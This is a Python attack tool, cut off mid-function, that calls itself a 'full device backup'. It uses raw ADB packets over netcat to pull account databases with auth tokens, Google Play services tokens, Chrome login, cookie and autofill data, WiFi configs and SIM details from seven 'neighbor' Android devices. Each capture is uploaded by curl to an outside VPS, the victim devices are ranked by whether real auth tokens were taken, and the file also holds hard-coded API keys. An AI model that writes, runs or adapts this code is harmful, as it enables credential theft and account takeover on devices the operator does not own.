#!/usr/bin/env python3
"""
full_device_backup.py
=====================
Full device backup pipeline — extracts EVERYTHING from neighbor devices:
  - ALL system properties (getprop)
  - ALL installed packages (system + user)
  - accounts_ce.db (with auth tokens) 
  - GMS data (COIN.xml, auth tokens, account manager state)
  - Chrome data (Login Data, Cookies, Web Data)
  - WiFi config
  - /data/system/ (package permissions, settings, accounts)
  - /data/system_ce/0/ (account databases, authtokens)
  - /data/data/ app private data for EVERY app
  - /system/app/ and /system/priv-app/ (all system APKs)
  - /data/app/ (all user APK installs)
  - Proxy/DNS/network config
  - Device serial, IMEI, SIM state

Uses the proven ADB-over-nc binary packet approach with tar streaming.
Each device gets a full tar.gz backup uploaded to VPS.
"""

import asyncio
import base64
import json
import os
import struct
import sys
import time
import re
from datetime import datetime
from pathlib import Path

sys.path.insert(0, "/root/CascadeProjects/vmos-titan-unified")
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

# ═══════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════

AK = "BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi"
SK = "Q2SgcSwEfuwoedY0cijp6Mce"
BASE = "https://api.vmoscloud.com"

LAUNCHPAD = "APP6476KYH9KMLU5"
RESTORE_TARGETS = ["APP5BJ4LRVRJFJQR", "APP6476KYH9KMLU5"]

VPS_IP = "37.60.234.139"
VPS_PORT = 8888

WORK_DIR = "/data/local/tmp/fullbackup"
LOCAL_BACKUP_DIR = "/root/CascadeProjects/vmos-titan-unified/full_backups"
UPLOAD_DIR = "/root/CascadeProjects/vmos-titan-unified/neighbor_clones"  # Where VPS receiver saves

# All 7 targets — ROOT ones get deeper extraction
TARGETS = [
    {"ip": "10.12.21.175", "access": "root", "label": "S25_Ultra_175"},
    {"ip": "10.12.27.39",  "access": "root", "label": "Pixel4_39"},
    {"ip": "10.12.27.46",  "access": "root", "label": "Huawei_46"},
    {"ip": "10.12.11.101", "access": "root", "label": "Xiaomi_101"},
    {"ip": "10.12.11.21",  "access": "root", "label": "Root_21"},
    {"ip": "10.12.36.76",  "access": "shell", "label": "SamsungA22_76"},
    {"ip": "10.12.31.245", "access": "shell", "label": "SamsungS20_245"},
]

# ═══════════════════════════════════════════════════════════════════
# ADB PACKET BUILDERS (proven correct)
# ═══════════════════════════════════════════════════════════════════

def build_cnxn() -> bytes:
    payload = b"host::\x00"
    cmd = 0x4E584E43
    cksum = sum(payload) & 0xFFFFFFFF
    magic = (cmd ^ 0xFFFFFFFF) & 0xFFFFFFFF
    return struct.pack("<6I", cmd, 0x01000000, 256 * 1024, len(payload), cksum, magic) + payload

def build_open(local_id: int, service: str) -> bytes:
    payload = (service + "\x00").encode("utf-8")
    cmd = 0x4E45504F
    cksum = sum(payload) & 0xFFFFFFFF
    magic = (cmd ^ 0xFFFFFFFF) & 0xFFFFFFFF
    return struct.pack("<6I", cmd, local_id, 0, len(payload), cksum, magic) + payload

def extract_wrte_payload(raw: bytes) -> bytes:
    """Extract all WRTE frame payloads from raw ADB traffic."""
    payloads = []
    offset = 0
    while offset < len(raw) - 24:
        if offset + 24 > len(raw):
            break
        try:
            cmd, arg0, arg1, data_len, cksum, magic = struct.unpack_from("<6I", raw, offset)
        except Exception:
            offset += 1
            continue
        if magic != (cmd ^ 0xFFFFFFFF) & 0xFFFFFFFF:
            offset += 1
            continue
        ADB_CMDS = {0x45534C43, 0x59414B4F, 0x45545257, 0x4E584E43, 0x4E45504F, 0x48545541}
        if cmd not in ADB_CMDS:
            offset += 1
            continue
        header_end = offset + 24
        if cmd == 0x45545257 and data_len > 0 and header_end + data_len <= len(raw):
            payloads.append(raw[header_end:header_end + data_len])
        offset = header_end + data_len if data_len > 0 else header_end
    return b"".join(payloads)

# ═══════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════

def log(msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}", flush=True)

async def qcmd(client, cmd, timeout=15):
    """Execute on LAUNCHPAD, return stdout."""
    try:
        r = await client.sync_cmd(LAUNCHPAD, cmd, timeout_sec=timeout)
        data = r.get("data", [{}])
        if isinstance(data, list) and data:
            return data[0].get("errorMsg", "") or ""
        return str(data) if data else ""
    except Exception as e:
        return f"ERROR:{e}"

async def push_b64(client, data: bytes, remote_path: str):
    """Push binary data to device via chunked base64."""
    b64 = base64.b64encode(data).decode()
    chunk_size = 3000
    chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
    for i, chunk in enumerate(chunks):
        op = ">" if i == 0 else ">>"
        await qcmd(client, f"printf '%s' '{chunk}' {op} {remote_path}.b64")
        await asyncio.sleep(3)
    await qcmd(client, f"base64 -d {remote_path}.b64 > {remote_path} && rm -f {remote_path}.b64")
    await asyncio.sleep(3)

def generate_backup_script(targets):
    """Generate the on-device shell script that backs up each neighbor completely."""
    
    script = """#!/bin/sh
# ═══════════════════════════════════════════════════════════════
# FULL DEVICE BACKUP — tar entire device data from each neighbor
# ═══════════════════════════════════════════════════════════════
set -e
WORK="WORK_DIR_PLACEHOLDER"
VPS="VPS_IP_PLACEHOLDER"
VPS_PORT=VPS_PORT_PLACEHOLDER
CN="$WORK/cn.bin"
LOG="$WORK/backup.log"

exec > "$LOG" 2>&1
echo "BACKUP_START $(date)"

run_adb_cmd() {
    TARGET=$1
    CMD_SERVICE=$2
    WAIT=$3
    TAG=$4
    OUTFILE="$WORK/${TAG}.raw"
    
    # Build OPEN packet for this command
    OP_FILE="$WORK/op_${TAG}.bin"
    
    # Send CNXN + OPEN, capture response
    { cat "$CN"; sleep 0.3; cat "$OP_FILE"; sleep $WAIT; } | timeout $((WAIT + 10)) nc "$TARGET" 5555 > "$OUTFILE" 2>/dev/null
    SZ=$(stat -c%s "$OUTFILE" 2>/dev/null || echo 0)
    echo "  $TAG: ${SZ}B"
    
    # Upload to VPS
    if [ "$SZ" -gt 24 ]; then
        curl -s -X PUT --data-binary "@$OUTFILE" "http://${VPS}:${VPS_PORT}/${TAG}.bin" > /dev/null 2>&1
        echo "OK $SZ"
    else
        echo "SKIP $SZ (too small)"
    fi
}

"""
    
    # Define ALL extraction commands per device
    # For ROOT devices: full /data tar archives
    # For SHELL devices: whatever shell can access
    
    for t in targets:
        ip = t["ip"]
        tag = ip.replace(".", "_")
        access = t["access"]
        label = t["label"]
        
        script += f"""
# ═══ {label} ({ip}) [{access.upper()}] ═══
echo "=== {ip} ({label}) ==="
echo "{tag}_processing" > "$WORK/status.txt"

"""
        # COMMAND LIST — different for root vs shell
        # Each command: (tag_suffix, service_string, wait_seconds)
        commands = [
            # Basic identity
            ("id", "shell:id", 3),
            ("getprop", "shell:getprop", 10),
            ("allpkgs", "shell:pm list packages -f", 15),  # ALL packages including system
            ("accounts", "shell:dumpsys account 2>/dev/null", 15),
            ("settings", "shell:settings list system 2>/dev/null; echo '---SECURE---'; settings list secure 2>/dev/null; echo '---GLOBAL---'; settings list global 2>/dev/null", 15),
        ]
        
        if access == "root":
            commands += [
                # Account databases (the gold — auth tokens live here)
                ("acct_db", "shell:cat /data/system_ce/0/accounts_ce.db 2>/dev/null | gzip | base64", 20),
                ("acct_de", "shell:cat /data/system_de/0/accounts_de.db 2>/dev/null | gzip | base64", 20),
                # GMS auth — critical for zero-relogin
                ("gms_tokens", "shell:cat /data/data/com.google.android.gms/databases/phenotype.db 2>/dev/null | gzip | base64", 25),
                ("gms_coin", "shell:cat /data/data/com.google.android.gms/shared_prefs/COIN.xml 2>/dev/null", 10),
                ("gms_prefs", "shell:ls /data/data/com.google.android.gms/shared_prefs/ 2>/dev/null", 5),
                ("gms_auth", "shell:cat /data/data/com.google.android.gms/shared_prefs/CheckinService.xml 2>/dev/null", 10),
                ("gms_gsfid", "shell:cat /data/data/com.google.android.gms/shared_prefs/adid_settings.xml 2>/dev/null; echo '---GSFID---'; cat /data/data/com.google.android.gsf/databases/gservices.db 2>/dev/null | gzip | base64", 15),
                # System state
                ("packages_xml", "shell:cat /data/system/packages.xml 2>/dev/null | gzip | base64", 30),
                ("packages_list", "shell:cat /data/system/packages.list 2>/dev/null", 10),
                ("users_xml", "shell:cat /data/system/users/0.xml 2>/dev/null", 5),
                ("runtime_perms", "shell:cat /data/misc/profiles/cur/0/*/primary.prof 2>/dev/null | wc -c; ls /data/system/users/0/runtime-permissions.xml 2>/dev/null && cat /data/system/users/0/runtime-permissions.xml 2>/dev/null | gzip | base64", 20),
                # Chrome data (logins, cookies, autofill)
                ("chrome_login", "shell:cat /data/data/com.android.chrome/app_chrome/Default/Login\\ Data 2>/dev/null | gzip | base64", 20),
                ("chrome_cookies", "shell:cat /data/data/com.android.chrome/app_chrome/Default/Cookies 2>/dev/null | gzip | base64", 20),
                ("chrome_webdata", "shell:cat /data/data/com.android.chrome/app_chrome/Default/Web\\ Data 2>/dev/null | gzip | base64", 20),
                ("chrome_prefs", "shell:cat /data/data/com.android.chrome/app_chrome/Default/Preferences 2>/dev/null", 15),
                # WiFi
                ("wifi_conf", "shell:cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null", 10),
                ("wifi_p2p", "shell:cat /data/misc/wifi/p2p_supplicant.conf 2>/dev/null", 5),
                # SIM / telephony
                ("telephony", "shell:dumpsys telephony.registry 2>/dev/null | head -100; echo '---ISMS---'; service call isms 1 2>/dev/null | head -5", 10),
                ("sim_info", "shell:content query --uri content://telephony/siminfo 2>/dev/null", 10),
                # Network/proxy
                ("proxy", "shell:getprop | grep -iE 'proxy|dns|smart_ip|net\\.'; settings get global http_proxy 2>/dev/null; cat /data/misc/ethernet/ipconfig.txt 2>/dev/null", 5),
                # Keystore
                ("keystore_ls", "shell:ls -laR /data/misc/keystore/ 2>/dev/null; ls -laR /data/misc/user/0/cacerts-added/ 2>/dev/null", 5),
                # App data tarballs — THE BIG ONES
                # We tar critical app data directories individually
                ("tar_gms", "shell:tar czf - /data/data/com.google.android.gms/databases/ /data/data/com.google.android.gms/shared_prefs/ 2>/dev/null | base64", 45),
                ("tar_gsf", "shell:tar czf - /data/data/com.google.android.gsf/databases/ /data/data/com.google.android.gsf/shared_prefs/ 2>/dev/null | base64", 30),
                ("tar_vending", "shell:tar czf - /data/data/com.android.vending/databases/ /data/data/com.android.vending/shared_prefs/ 2>/dev/null | base64", 30),
                ("tar_chrome", "shell:tar czf - /data/data/com.android.chrome/app_chrome/Default/ 2>/dev/null | base64", 40),
                ("tar_accts", "shell:tar czf - /data/system_ce/0/ /data/system_de/0/ 2>/dev/null | base64", 30),
                # Full /data/system backup
                ("tar_sys_state", "shell:tar czf - /data/system/packages.xml /data/system/packages.list /data/system/users/ /data/system/sync/ /data/system/registered_services/ 2>/dev/null | base64", 30),
                # All 3rd party app APKs list with paths
                ("apk_paths", "shell:pm list packages -f -3 2>/dev/null", 10),
                # System APK list
                ("sys_apk_paths", "shell:pm list packages -f -s 2>/dev/null", 15),
                # Build.prop / device identity
                ("build_prop", "shell:cat /system/build.prop 2>/dev/null", 10),
                ("vendor_prop", "shell:cat /vendor/build.prop 2>/dev/null; cat /vendor/default.prop 2>/dev/null", 10),
            ]
        else:
            # SHELL access — limited but still useful
            commands += [
                ("acct_db", "shell:cat /data/system_ce/0/accounts_ce.db 2>/dev/null | gzip | base64", 15),
                ("chrome_ls", "shell:ls -laR /data/data/com.android.chrome/app_chrome/Default/ 2>/dev/null", 8),
                ("wifi_conf", "shell:cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null", 8),
                ("proxy", "shell:getprop | grep -iE 'proxy|dns|smart_ip'; settings get global http_proxy 2>/dev/null", 5),
                ("apk_paths", "shell:pm list packages -f -3 2>/dev/null", 10),
                ("sys_apk_paths", "shell:pm list packages -f -s 2>/dev/null", 15),
                ("settings", "shell:settings list system 2>/dev/null; echo '---SECURE---'; settings list secure 2>/dev/null; echo '---GLOBAL---'; settings list global 2>/dev/null", 10),
                ("build_prop", "shell:cat /system/build.prop 2>/dev/null", 10),
                ("sim_info", "shell:content query --uri content://telephony/siminfo 2>/dev/null", 5),
                ("telephony", "shell:dumpsys telephony.registry 2>/dev/null | head -80", 8),
            ]
        
        for cmd_tag, service, wait in commands:
            full_tag = f"{tag}_{cmd_tag}"
            script += f'run_adb_cmd "{ip}" "{service}" {wait} "{full_tag}"\n'
            script += f'sleep 1\n'
        
        script += f'\necho "{tag} DONE"\n'
        script += f'echo "{tag}_done" >> "$WORK/status.txt"\n\n'
    
    script += """
echo "BACKUP_DONE $(date)" >> "$WORK/status.txt"
echo "BACKUP_DONE $(date)"
"""
    
    script = script.replace("WORK_DIR_PLACEHOLDER", WORK_DIR)
    script = script.replace("VPS_IP_PLACEHOLDER", VPS_IP)
    script = script.replace("VPS_PORT_PLACEHOLDER", str(VPS_PORT))
    
    return script, commands

def get_all_commands_for_targets(targets):
    """Return a flat dict of tag -> (service, wait) for all targets+commands."""
    all_cmds = {}
    for t in targets:
        ip = t["ip"]
        tag = ip.replace(".", "_")
        access = t["access"]
        
        commands = [
            ("id", "shell:id", 3),
            ("getprop", "shell:getprop", 10),
            ("allpkgs", "shell:pm list packages -f", 15),
            ("accounts", "shell:dumpsys account 2>/dev/null", 15),
            ("settings", "shell:settings list system 2>/dev/null; echo '---SECURE---'; settings list secure 2>/dev/null; echo '---GLOBAL---'; settings list global 2>/dev/null", 15),
        ]
        
        if access == "root":
            commands += [
                ("acct_db", "shell:cat /data/system_ce/0/accounts_ce.db 2>/dev/null | gzip | base64", 20),
                ("acct_de", "shell:cat /data/system_de/0/accounts_de.db 2>/dev/null | gzip | base64", 20),
                ("gms_tokens", "shell:cat /data/data/com.google.android.gms/databases/phenotype.db 2>/dev/null | gzip | base64", 25),
                ("gms_coin", "shell:cat /data/data/com.google.android.gms/shared_prefs/COIN.xml 2>/dev/null", 10),
                ("gms_prefs", "shell:ls /data/data/com.google.android.gms/shared_prefs/ 2>/dev/null", 5),
                ("gms_auth", "shell:cat /data/data/com.google.android.gms/shared_prefs/CheckinService.xml 2>/dev/null", 10),
                ("gms_gsfid", "shell:cat /data/data/com.google.android.gms/shared_prefs/adid_settings.xml 2>/dev/null; echo '---GSFID---'; cat /data/data/com.google.android.gsf/databases/gservices.db 2>/dev/null | gzip | base64", 15),
                ("packages_xml", "shell:cat /data/system/packages.xml 2>/dev/null | gzip | base64", 30),
                ("packages_list", "shell:cat /data/system/packages.list 2>/dev/null", 10),
                ("users_xml", "shell:cat /data/system/users/0.xml 2>/dev/null", 5),
                ("runtime_perms", "shell:cat /data/misc/profiles/cur/0/*/primary.prof 2>/dev/null | wc -c; ls /data/system/users/0/runtime-permissions.xml 2>/dev/null && cat /data/system/users/0/runtime-permissions.xml 2>/dev/null | gzip | base64", 20),
                ("chrome_login", "shell:cat /data/data/com.android.chrome/app_chrome/Default/Login\\ Data 2>/dev/null | gzip | base64", 20),
                ("chrome_cookies", "shell:cat /data/data/com.android.chrome/app_chrome/Default/Cookies 2>/dev/null | gzip | base64", 20),
                ("chrome_webdata", "shell:cat /data/data/com.android.chrome/app_chrome/Default/Web\\ Data 2>/dev/null | gzip | base64", 20),
                ("chrome_prefs", "shell:cat /data/data/com.android.chrome/app_chrome/Default/Preferences 2>/dev/null", 15),
                ("wifi_conf", "shell:cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null", 10),
                ("wifi_p2p", "shell:cat /data/misc/wifi/p2p_supplicant.conf 2>/dev/null", 5),
                ("telephony", "shell:dumpsys telephony.registry 2>/dev/null | head -100; echo '---ISMS---'; service call isms 1 2>/dev/null | head -5", 10),
                ("sim_info", "shell:content query --uri content://telephony/siminfo 2>/dev/null", 10),
                ("proxy", "shell:getprop | grep -iE 'proxy|dns|smart_ip|net\\.'; settings get global http_proxy 2>/dev/null; cat /data/misc/ethernet/ipconfig.txt 2>/dev/null", 5),
                ("keystore_ls", "shell:ls -laR /data/misc/keystore/ 2>/dev/null; ls -laR /data/misc/user/0/cacerts-added/ 2>/dev/null", 5),
                ("tar_gms", "shell:tar czf - /data/data/com.google.android.gms/databases/ /data/data/com.google.android.gms/shared_prefs/ 2>/dev/null | base64", 45),
                ("tar_gsf", "shell:tar czf - /data/data/com.google.android.gsf/databases/ /data/data/com.google.android.gsf/shared_prefs/ 2>/dev/null | base64", 30),
                ("tar_vending", "shell:tar czf - /data/data/com.android.vending/databases/ /data/data/com.android.vending/shared_prefs/ 2>/dev/null | base64", 30),
                ("tar_chrome", "shell:tar czf - /data/data/com.android.chrome/app_chrome/Default/ 2>/dev/null | base64", 40),
                ("tar_accts", "shell:tar czf - /data/system_ce/0/ /data/system_de/0/ 2>/dev/null | base64", 30),
                ("tar_sys_state", "shell:tar czf - /data/system/packages.xml /data/system/packages.list /data/system/users/ /data/system/sync/ /data/system/registered_services/ 2>/dev/null | base64", 30),
                ("apk_paths", "shell:pm list packages -f -3 2>/dev/null", 10),
                ("sys_apk_paths", "shell:pm list packages -f -s 2>/dev/null", 15),
                ("build_prop", "shell:cat /system/build.prop 2>/dev/null", 10),
                ("vendor_prop", "shell:cat /vendor/build.prop 2>/dev/null; cat /vendor/default.prop 2>/dev/null", 10),
            ]
        else:
            commands += [
                ("acct_db", "shell:cat /data/system_ce/0/accounts_ce.db 2>/dev/null | gzip | base64", 15),
                ("chrome_ls", "shell:ls -laR /data/data/com.android.chrome/app_chrome/Default/ 2>/dev/null", 8),
                ("wifi_conf", "shell:cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null", 8),
                ("proxy", "shell:getprop | grep -iE 'proxy|dns|smart_ip'; settings get global http_proxy 2>/dev/null", 5),
                ("apk_paths", "shell:pm list packages -f -3 2>/dev/null", 10),
                ("sys_apk_paths", "shell:pm list packages -f -s 2>/dev/null", 15),
                ("settings", "shell:settings list system 2>/dev/null; echo '---SECURE---'; settings list secure 2>/dev/null; echo '---GLOBAL---'; settings list global 2>/dev/null", 10),
                ("build_prop", "shell:cat /system/build.prop 2>/dev/null", 10),
                ("sim_info", "shell:content query --uri content://telephony/siminfo 2>/dev/null", 5),
                ("telephony", "shell:dumpsys telephony.registry 2>/dev/null | head -80", 8),
            ]
        
        for cmd_tag, service, wait in commands:
            full_tag = f"{tag}_{cmd_tag}"
            all_cmds[full_tag] = (service, wait)
    
    return all_cmds

# ═══════════════════════════════════════════════════════════════════
# PHASE 1: Push all ADB OPEN packets
# ═══════════════════════════════════════════════════════════════════

async def phase1_push_packets(client):
    log("═══ PHASE 1: Generate & Push ADB Binary Packets (bundled) ═══")
    await qcmd(client, f"rm -rf {WORK_DIR} && mkdir -p {WORK_DIR}")
    await asyncio.sleep(3)
    
    all_cmds = get_all_commands_for_targets(TARGETS)
    
    # Build ALL packets locally, tar them, push as one bundle
    import tarfile, io, tempfile
    
    cnxn = build_cnxn()
    
    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode="w:gz") as tar:
        # Add CNXN
        info = tarfile.TarInfo(name="cn.bin")
        info.size = len(cnxn)
        tar.addfile(info, io.BytesIO(cnxn))
        
        # Add all OPEN packets
        local_id = 1
        for tag, (service, wait) in all_cmds.items():
            pkt = build_open(local_id, service)
            info = tarfile.TarInfo(name=f"op_{tag}.bin")
            info.size = len(pkt)
            tar.addfile(info, io.BytesIO(pkt))
            local_id += 1
    
    bundle = tar_buf.getvalue()
    log(f"  Bundle: {len(all_cmds)} OPEN packets + CNXN = {len(bundle)} bytes tar.gz")
    
    # Push the tar bundle via chunked base64
    await push_b64(client, bundle, f"{WORK_DIR}/packets.tar.gz")
    
    # Extract on device
    await qcmd(client, f"cd {WORK_DIR} && tar xzf packets.tar.gz && rm -f packets.tar.gz")
    await asyncio.sleep(3)
    
    # Verify
    verify = await qcmd(client, f"ls {WORK_DIR}/op_*.bin | wc -l")
    log(f"  Extracted {verify.strip()} OPEN packets on device")
    cnxn_verify = await qcmd(client, f"wc -c {WORK_DIR}/cn.bin")
    log(f"  CNXN verify: {cnxn_verify.strip()}")
    return all_cmds

# ═══════════════════════════════════════════════════════════════════
# PHASE 2: Push the backup shell script
# ═══════════════════════════════════════════════════════════════════

async def phase2_push_script(client, all_cmds):
    log("═══ PHASE 2: Push Backup Shell Script ═══")
    
    script_content, _ = generate_backup_script(TARGETS)
    script_bytes = script_content.encode("utf-8")
    log(f"  Script: {len(script_bytes)} bytes")
    
    await push_b64(client, script_bytes, f"{WORK_DIR}/backup.sh")
    await qcmd(client, f"chmod +x {WORK_DIR}/backup.sh")
    await asyncio.sleep(3)
    
    # Verify
    verify = await qcmd(client, f"wc -c {WORK_DIR}/backup.sh; head -3 {WORK_DIR}/backup.sh")
    log(f"  Verify: {verify.strip()}")

# ═══════════════════════════════════════════════════════════════════
# PHASE 3: Execute backup (fire and poll)
# ═══════════════════════════════════════════════════════════════════

async def phase3_execute(client, all_cmds):
    log("═══ PHASE 3: Execute Full Backup ═══")
    
    total_targets = len(TARGETS)
    total_cmds = len(all_cmds)
    
    # Fire the script  
    await client.async_adb_cmd([LAUNCHPAD], f"nohup sh {WORK_DIR}/backup.sh > {WORK_DIR}/backup_stdout.log 2>&1 &")
    log(f"  Backup script launched. {total_cmds} extraction commands across {total_targets} targets.")
    log(f"  Estimated time: ~15-25 minutes (heavy tar archives)")
    log(f"  Polling every 20s...")
    
    start = time.time()
    max_wait = 2400  # 40 minutes max
    
    while time.time() - start < max_wait:
        await asyncio.sleep(20)
        elapsed = int(time.time() - start)
        
        # Check status
        status = await qcmd(client, f"cat {WORK_DIR}/status.txt 2>/dev/null", timeout=10)
        
        if "BACKUP_DONE" in status:
            log(f"  ✓ Full backup completed after {elapsed}s")
            break
        
        # Count completed targets
        done_count = status.count("_done")
        processing = ""
        for line in status.strip().split("\n"):
            if line.endswith("_processing"):
                processing = line.replace("_processing", "")
        
        log(f"  [{elapsed}s] {done_count}/{total_targets} targets done. Current: {processing}")
    else:
        log(f"  ⚠ Timeout after {max_wait}s — checking partial results")
    
    # Show log tail
    log_tail = await qcmd(client, f"tail -30 {WORK_DIR}/backup.log 2>/dev/null", timeout=15)
    log(f"  Log tail:\n{log_tail}")

# ═══════════════════════════════════════════════════════════════════
# PHASE 4: Parse all results
# ═══════════════════════════════════════════════════════════════════

async def phase4_parse(client, all_cmds):
    log("═══ PHASE 4: Parse All Results ═══")
    
    os.makedirs(LOCAL_BACKUP_DIR, exist_ok=True)
    manifests = {}
    
    for t in TARGETS:
        ip = t["ip"]
        tag = ip.replace(".", "_")
        label = t["label"]
        access = t["access"]
        
        log(f"\n  --- [{ip}] {label} ({access.upper()}) ---")
        manifest = {
            "ip": ip, "label": label, "access": access,
            "root": access == "root",
            "identity": {}, "accounts": [], "apps": [], "system_apps": [],
            "chrome": {}, "gms": {}, "wifi": {}, "auth_tokens": False,
            "tar_archives": {}, "raw_sizes": {},
        }
        
        # Create per-device backup folder
        dev_dir = os.path.join(LOCAL_BACKUP_DIR, tag)
        os.makedirs(dev_dir, exist_ok=True)
        
        # Process each command's output
        for cmd_tag_suffix, (service, wait) in all_cmds.items():
            if not cmd_tag_suffix.startswith(tag + "_"):
                continue
            
            suffix = cmd_tag_suffix[len(tag) + 1:]
            actual_path = os.path.join(UPLOAD_DIR, f"{cmd_tag_suffix}.bin")
            if not os.path.exists(actual_path):
                manifest["raw_sizes"][suffix] = 0
                continue
            
            raw = open(actual_path, "rb").read()
            content = extract_wrte_payload(raw)
            manifest["raw_sizes"][suffix] = len(raw)
            
            text = content.decode("utf-8", errors="replace").strip()
            
            # Save decoded content
            decoded_path = os.path.join(dev_dir, f"{suffix}.txt")
            with open(decoded_path, "w", errors="replace") as f:
                f.write(text)
            
            # Parse specific types
            if suffix == "id":
                manifest["root"] = "uid=0" in text
                log(f"    id: {'ROOT' if manifest['root'] else 'SHELL'}")
            
            elif suffix == "getprop":
                props = {}
                for line in text.split("\n"):
                    m = re.match(r'\[(.+?)\]:\s*\[(.+?)\]', line)
                    if m:
                        props[m.group(1)] = m.group(2)
                manifest["identity"] = {
                    "model": props.get("ro.product.model", "?"),
                    "brand": props.get("ro.product.brand", "?"),
                    "device": props.get("ro.product.device", "?"),
                    "fingerprint": props.get("ro.build.fingerprint", "?"),
                    "sdk": props.get("ro.build.version.sdk", "?"),
                    "security_patch": props.get("ro.build.version.security_patch", "?"),
                    "serial": props.get("ro.serialno", props.get("ro.boot.serialno", "?")),
                }
                manifest["all_props"] = props
                id_keys = [k for k in props if k.startswith(("ro.product.", "ro.build.", "ro.hardware", "ro.boot.", "ro.soc."))]
                log(f"    getprop: {len(props)} total, {len(id_keys)} identity, model={manifest['identity']['model']}")
            
            elif suffix == "allpkgs":
                pkgs = re.findall(r'package:(/[^\s=]+)=([a-zA-Z][\w.]+)', text)
                all_pkg_names = [p[1] for p in pkgs]
                manifest["all_packages"] = all_pkg_names
                manifest["package_paths"] = {p[1]: p[0] for p in pkgs}
                log(f"    allpkgs: {len(pkgs)} total")
            
            elif suffix == "accounts":
                accts = re.findall(r'Account\s*\{name=(.+?),\s*type=(.+?)\}', text)
                manifest["accounts"] = [{"name": n, "type": t2} for n, t2 in accts]
                log(f"    accounts: {len(accts)} — {[a[0] for a in accts]}")
            
            elif suffix in ("acct_db", "acct_de"):
                # base64 gzipped sqlite
                if text.startswith("H4sI") or (len(text) > 100 and re.match(r'^[A-Za-z0-9+/\s]', text)):
                    b64_clean = re.sub(r'\s+', '', text)
                    # Fix padding
                    pad = len(b64_clean) % 4
                    if pad:
                        b64_clean += "=" * (4 - pad)
                    try:
                        gz = base64.b64decode(b64_clean)
                        db = gzip.decompress(gz)
                        db_path = os.path.join(dev_dir, f"{suffix}.db")
                        with open(db_path, "wb") as f:
                            f.write(db)
                        log(f"    {suffix}: {len(db)}B sqlite saved")
                        
                        # Analyze
                        import sqlite3, tempfile
                        conn = sqlite3.connect(db_path)
                        cur = conn.cursor()
                        try:
                            cur.execute("SELECT _id, name, type FROM accounts")
                            rows = cur.fetchall()
                            for r in rows:
                                log(f"      Account #{r[0]}: {r[1]} ({r[2]})")
                        except Exception:
                            pass
                        try:
                            cur.execute("SELECT count(*) FROM authtokens")
                            tc = cur.fetchone()[0]
                            manifest["auth_tokens"] = tc > 0
                            log(f"      Auth tokens: {tc}")
                        except Exception:
                            pass
                        try:
                            cur.execute("SELECT count(*) FROM grants")
                            gc = cur.fetchone()[0]
                            log(f"      Grants: {gc}")
                        except Exception:
                            pass
                        conn.close()
                    except Exception as e:
                        log(f"    {suffix}: decode error — {e}")
                else:
                    if text:
                        log(f"    {suffix}: non-b64 ({len(text)}B)")
                    else:
                        log(f"    {suffix}: empty")
            
            elif suffix.startswith("tar_"):
                # base64 tar.gz archives
                if text and len(text) > 50:
                    b64_clean = re.sub(r'\s+', '', text)
                    pad = len(b64_clean) % 4
                    if pad:
                        b64_clean += "=" * (4 - pad)
                    try:
                        archive = base64.b64decode(b64_clean)
                        tar_path = os.path.join(dev_dir, f"{suffix}.tar.gz")
                        with open(tar_path, "wb") as f:
                            f.write(archive)
                        manifest["tar_archives"][suffix] = len(archive)
                        log(f"    {suffix}: {len(archive)}B tar.gz saved")
                    except Exception as e:
                        log(f"    {suffix}: decode error — {e}")
                else:
                    log(f"    {suffix}: empty/small")
            
            elif suffix.startswith("chrome_"):
                if "gzip" in service and text and len(text) > 50:
                    b64_clean = re.sub(r'\s+', '', text)
                    pad = len(b64_clean) % 4
                    if pad:
                        b64_clean += "=" * (4 - pad)
                    try:
                        gz = base64.b64decode(b64_clean)
                        db_data = gzip.decompress(gz)
                        chrome_path = os.path.join(dev_dir, f"{suffix}.db")
                        with open(chrome_path, "wb") as f:
                            f.write(db_data)
                        manifest["chrome"][suffix] = len(db_data)
                        log(f"    {suffix}: {len(db_data)}B saved")
                    except Exception as e:
                        log(f"    {suffix}: decode error — {e}")
                elif text:
                    log(f"    {suffix}: {len(text)}B text")
                    manifest["chrome"][suffix] = len(text)
            
            elif suffix == "gms_coin":
                if "<?xml" in text or "<map" in text:
                    manifest["gms"]["coin_xml"] = True
                    coin_path = os.path.join(dev_dir, "COIN.xml")
                    with open(coin_path, "w") as f:
                        f.write(text)
                    log(f"    COIN.xml: FOUND ({len(text)}B)")
                else:
                    log(f"    COIN.xml: not found")
            
            elif suffix == "build_prop":
                if text and len(text) > 100:
                    bp_path = os.path.join(dev_dir, "build.prop")
                    with open(bp_path, "w") as f:
                        f.write(text)
                    log(f"    build.prop: {len(text)}B")
            
            elif suffix == "wifi_conf":
                if text and ("SSID" in text or "network" in text.lower()):
                    wifi_path = os.path.join(dev_dir, "WifiConfigStore.xml")
                    with open(wifi_path, "w") as f:
                        f.write(text)
                    manifest["wifi"]["found"] = True
                    log(f"    wifi: {len(text)}B")
        
        manifests[ip] = manifest
    
    # Save full manifests
    manifest_path = os.path.join(LOCAL_BACKUP_DIR, "full_manifests.json")
    
    # Strip non-serializable data  
    clean_manifests = {}
    for ip, m in manifests.items():
        cm = dict(m)
        cm.pop("all_props", None)  # Too large for JSON overview
        clean_manifests[ip] = cm
    
    with open(manifest_path, "w") as f:
        json.dump(clean_manifests, f, indent=2, default=str)
    log(f"\n  Manifests saved: {manifest_path}")
    
    return manifests

# ═══════════════════════════════════════════════════════════════════
# PHASE 5: Score & select best devices for restore
# ═══════════════════════════════════════════════════════════════════

def score_device(manifest):
    """Score a device for restore priority."""
    s = 0
    if manifest.get("root"):
        s += 50
    s += len(manifest.get("accounts", [])) * 30
    s += len(manifest.get("identity", {}).get("model", "")) > 1 and 20 or 0
    s += len(manifest.get("all_packages", [])) * 2
    if manifest.get("auth_tokens"):
        s += 200  # HUGE bonus — real auth tokens = zero relogin
    for k, v in manifest.get("tar_archives", {}).items():
        if v > 1000:
            s += 50  # Has real tar data
    for k, v in manifest.get("chrome", {}).items():
        if v > 1000:
            s += 40
